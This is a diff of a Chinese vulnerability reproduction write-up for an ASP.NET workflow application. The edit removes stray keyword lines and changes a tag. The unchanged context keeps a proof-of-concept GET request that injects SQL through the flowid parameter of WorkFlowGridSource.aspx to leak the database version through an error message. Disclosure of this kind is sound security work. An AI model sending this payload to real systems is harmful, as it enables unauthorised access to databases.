@@ -51,14 +51,6 @@ protected void Page_Load(object sender, EventArgs e)
 
 # 漏洞复现
 
-深入探索
-
-防病毒程序与恶意软件
-
-搜索引擎
-
-代理
-
 ```
 GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid='-1/user-- HTTP/1.1
 Host: dongsheng.mrxn.net
@@ -68,4 +60,4 @@ Host: dongsheng.mrxn.net
 
 通过报错注入在响应里回显数据库版本信息。
 
-计算机安全
+网络安全
